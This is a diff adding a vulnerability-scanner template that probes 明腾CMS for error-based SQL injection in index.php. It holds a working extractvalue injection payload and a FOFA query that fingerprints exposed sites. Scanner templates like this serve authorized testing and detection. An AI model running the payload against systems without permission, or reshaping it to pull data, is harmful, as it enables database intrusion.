@@ -1,0 +1,17 @@
+id: poc-yaml-mintennet-cms-index-php-sqli
+info:
+  name: 明腾CMS index.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 明腾CMS
+  fofa: body="http://www.mingtengnet.com" || title=="明腾CMS管理中心登录"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /index.php?m=mingteng&c=Smstemplate&a=delTemplate&id=extractvalue(1%2C%20concat(0x7e%2C(select+md5%28{{.t1}}%29)%2C0x7e))
+  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,"SQLSTATE")
+    && contains(body,substr(t2,0,31))
+transport: http
